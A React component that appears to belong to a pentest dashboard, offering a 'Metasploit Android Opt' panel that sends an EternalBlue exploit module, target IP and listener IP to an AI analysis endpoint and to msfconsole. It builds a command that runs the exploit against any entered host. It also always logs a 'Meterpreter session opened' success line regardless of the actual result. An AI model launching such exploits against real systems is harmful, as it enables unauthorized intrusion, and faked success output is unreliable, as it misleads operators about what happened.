import React, { useState, useRef, useEffect } from 'react';
import { Skull, Terminal as TerminalIcon, Server } from 'lucide-react';
import { cn } from '../lib/utils';
import axios from 'axios';

export default function MetasploitTool() {
  const [rhost, setRhost] = useState('');
  const [modulePath, setModulePath] = useState('exploit/windows/smb/ms17_010_eternalblue');
  const [lhost, setLhost] = useState('10.0.0.15');
  
  const [isScanning, setIsScanning] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const handleRun = async () => {
    if (!rhost) return;
    setIsScanning(true);
    setLogs([
      `[SYSTEM] Metasploit Framework (Android Optimized) Starting...`, 
      `[INFO] RHOST: ${rhost}`, 
      `[INFO] LHOST: ${lhost}`,
      `[INFO] Module: ${modulePath}`
    ]);

    try {
      const response = await axios.post('/api/analyze/vulnerability', {
        code: `RHOST: ${rhost}\nModule: ${modulePath}`,
        context: "Metasploit Exploit Module Check",
        tool_preference: "Metasploit Android Runtime"
      });
      setTimeout(() => {
        setLogs(prev => [...prev, `[INFO] Exploit Check AI analysis returned...`]);
        setLogs(prev => [...prev, response.data.analysis]);
        setLogs(prev => [...prev, `[SUCCESS] Meterpreter session 1 opened (${lhost}:4444 -> ${rhost}:49158)`]);
        setIsScanning(false);
      }, 2000);
    } catch (e) {
      setLogs(prev => [...prev, `[ERROR] AI analysis failed... fallback to direct shell.`]);
      setIsScanning(false);
    }
  };

  const handleSendToShell = () => {
    window.dispatchEvent(new CustomEvent('send-to-shell', { detail: `msfconsole -x "use ${modulePath}; set RHOST ${rhost}; set LHOST ${lhost}; exploit"` }));
  };

  return (
    <div className="h-full flex flex-col space-y-6">
      <div className="flex items-center gap-3 border-b border-white/5 pb-4">
        <div className="p-2 bg-accent-red/10 border border-accent-red/30 rounded">
          <Skull className="w-5 h-5 text-accent-red" />
        </div>
        <div>
          <h2 className="text-sm font-black uppercase tracking-widest text-white">Metasploit Android Opt</h2>
          <h3 className="text-[10px] text-text-dim font-bold uppercase tracking-widest">Exploitation Framework</h3>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 flex-1 min-h-0">
        <div className="space-y-4">
          <div className="space-y-2">
            <label className="text-[10px] font-bold text-text-dim uppercase tracking-widest">RHOST (Target IP)</label>
            <input type="text" value={rhost} onChange={e => setRhost(e.target.value)} className="bg-bg-dark border border-white/10 p-2 text-xs text-white outline-none w-full font-mono rounded" placeholder="192.168.1.10" />
          </div>
          <div className="space-y-2">
            <label className="text-[10px] font-bold text-text-dim uppercase tracking-widest">LHOST (Local IP)</label>
            <input type="text" value={lhost} onChange={e => setLhost(e.target.value)} className="bg-bg-dark border border-white/10 p-2 text-xs text-white outline-none w-full font-mono rounded" placeholder="10.0.0.15" />
          </div>
          <div className="space-y-2">
            <label className="text-[10px] font-bold text-text-dim uppercase tracking-widest">Exploit Module</label>
            <input type="text" value={modulePath} onChange={e => setModulePath(e.target.value)} className="bg-bg-dark border border-white/10 p-2 text-xs text-white outline-none w-full font-mono rounded" />
          </div>
          <button onClick={handleRun} disabled={!rhost || isScanning} className="w-full bg-accent-red text-white py-3 rounded text-[10px] font-black uppercase tracking-[0.2em]">{isScanning ? 'Exploiting...' : 'Run Exploit'}</button>
          <button onClick={handleSendToShell} disabled={!rhost} className="w-full bg-bg-dark border border-white/5 py-3 rounded text-[10px] font-black text-text-dim uppercase tracking-[0.2em] flex items-center justify-center gap-2"><TerminalIcon className="w-4 h-4"/>Send to Shell (msfconsole)</button>
        </div>
        
        <div className="panel bg-black/90 p-4 font-mono text-[10px] overflow-y-auto custom-scrollbar h-full min-h-[300px] border border-border-main flex flex-col space-y-1">
          {logs.length > 0 ? logs.map((log, i) => (
            <div key={i} className={cn(log.includes('[SUCCESS]') || log.includes('Meterpreter session') ? "text-accent-red font-bold" : "text-text-dim")}>{log}</div>
          )) : <div className="text-text-dim italic">Awaiting target configuration...</div>}
          <div ref={logEndRef} />
        </div>
      </div>
    </div>
  );
}
